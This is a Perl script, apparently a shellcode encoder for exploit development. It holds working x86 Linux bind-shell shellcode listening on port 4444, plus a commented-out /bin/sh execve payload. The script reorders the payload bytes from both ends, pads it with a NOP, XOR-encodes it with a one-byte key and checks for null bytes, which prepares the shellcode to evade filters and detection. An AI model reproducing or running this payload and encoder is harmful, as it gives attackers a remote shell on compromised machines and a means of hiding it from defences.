#!/usr/bin/perl
print "#############################################################################\n";
print "This tool will read the bytecode, replace the values starting from the edges.\n";
print "It will also add a nop sled to the end if odd.\n";
print "e.g: code: ABCDE -> ABCDE0 -> 0AEBDC\n";
print "#############################################################################\n";
#$code="\x65\x47\x47\x68\x31\xc0\xb0\x66\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x31\xd2\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x53\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x93\x59\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

#bind shellcode on 4444
$code="\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x31\xd2\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x53\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x93\x59\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

#balazszoli
#$code="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

$secret="\x32";
$issue="No issues!";



#put the hex representation in $codeh
$codeh=unpack("H*",$code);
$codelen=length($code);
print "[+] Hexa code:\n".$codeh."\n";
print "Hexa length    : ".$codelen."\n";


#print out the code using /x
$hexor_print="";
for ($i1=0;$i1<$codelen;$i1++)
{
	$encoded=unpack("H*",substr($code,$i1,1));
	$hexor_print=$hexor_print.",0x".$encoded;
	if ($encoded eq "00") {$issue="WARNING: code contains \"0x00\"...cannot be executed...do something!!!";print $issue."\n";exit(1);};
}
print "\n[+] Original shellcode:\n".$hexor_print."\n";

print "___________________________________\n";

#put the hex representation in $secreth
$secreth=unpack("H*",$secret);
$secretlen=length($secret);
print "Secret         : 0x".$secreth."\n";
print "Secret lenght  : ".$secretlen."\n";
print "___________________________________\n";
#determine if length of code can be divided by 2 or nor
#if not, r1 will be <>0
$len1=$codelen / 2;
$rem1=$codelen % 2;

#if length is not dividable by 2, we will add a nop sled at the end
print "Old Length : ".$codelen."\n";
print "Divided    : ".$len1."\n";
print "Remainder  : ".$rem1."\n";

if ($rem1 ne 0) {$codeh=$codeh."90"};
$code=pack("H*",$codeh);
$codelen=length($code);
print "New Length : ".$codelen."\n";
print "Added $rem1 nop: 0x90\n";
print "[+] Extended:\n".$codeh."\n";
print "___________________________________\n";

print "\n";
$newcode="";
#do the mixing of chars. read first,last, put them beside each other. Result e.g: code: ABCDE0 -> 0AEBDC\n;
#print "Changes:\n";
@codearray[$codelen];
for ($i1=0;$i1<$len1;$i1++)
{
	$first=substr($codeh,$i1*2,2);
	$last=substr($codeh,($codelen-1-$i1)*2,2);
	$newcode=$newcode.$last.$first;
	@codearray[$i1]=$last;
	@codearray[$codelen-$i1]=$first;
#	print $i1.":".$first." <-> ".($codelen-1-$i1).":".$last."\n";
}
#print out the code as raw hexa
print "[+] Raw crazymixed code:\n".$newcode."\n";

#print out the code using /x
$hexor_print="";
for ($i1=0;$i1<$codelen;$i1++)
{
	$encoded=substr($newcode,$i1*2,2);
	$hexor_print=$hexor_print.",0x".$encoded;
	if ($encoded eq "00") {$issue="WARNING: MIXED contains \"0x00\"...cannot be executed...do something!!!";};
}
print "\n[+] Crazymixed shellcode:\n".$hexor_print."\n";
print "\nCodelength: $codelen\n\n";

#encrypt using XOR
$hexor_print="";
$hexor="";
for ($i=0;$i<$codelen;$i++)
{
	$encoded=unpack('H*',substr($code,$i,1)^$secret);	
	$hexor=$hexor.$encoded;
	$hexor_print=$hexor_print.",0x".$encoded;
	if ($encoded eq "00") {$issue="WARNING: HEX contains \"0x00\"...cannot be executed...do something!!!";};
}
print "[+] XOR encrypted crazymixed raw:\n".$hexor."\n";
print "\n[+] XOR encrypted crazymixed shellcode\n".$hexor_print."\n";
print "\nCodelength: $codelen\n\n";


print "[+] Reversed code:\n";
foreach $i (@codearray)
{
	if ($i ne "") {print $i;}
}
print "\n";

print "\n[+] Reversed shellcode:\n";
foreach $i (@codearray)
{
	if ($i ne "") {print ",0x".$i;};
}
print "\n";
print "\nCodelength: $codelen\n\n";


#encrypt using XOR
print "\n";
$hexor_print="";
$hexor="";
for ($i=0;$i<$codelen;$i++)
{
	$encoded=unpack("H*",pack("H*",@codearray[$i])^$secret);
#	$encoded=unpack('H*',$xx^$secret);
	$hexor=$hexor.$encoded;
	$hexor_print=$hexor_print.",0x".$encoded;
	if ($encoded eq "00") {$issue="WARNING: HEX contains \"0x00\"...cannot be executed...do something!!!";};
}
print "[+] XOR encrypted reversed raw:\n".$hexor."\n";
print "\n[+] XOR encrypted reversed shellcode\n".$hexor_print."\n";
print "\nCodelength: $codelen\n\n";


print "#############################################################################\n";
print "\n[+] Exit: $issue!\n";


exit(1);

## convert each character from the string into HEX code
#$string =~ s/(.)/sprintf("%X",ord($1))/eg;
#print "Hex: $string\n";

#$x1=unpack("H*",$string);
#print "Pack H:".$x1."\n";

#$x2=pack("H*",$x1);
#print "Pack C:".$x2."\n";


## convert each two digit into char code
#$string =~ s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/eg;
#print "Char: $string\n";

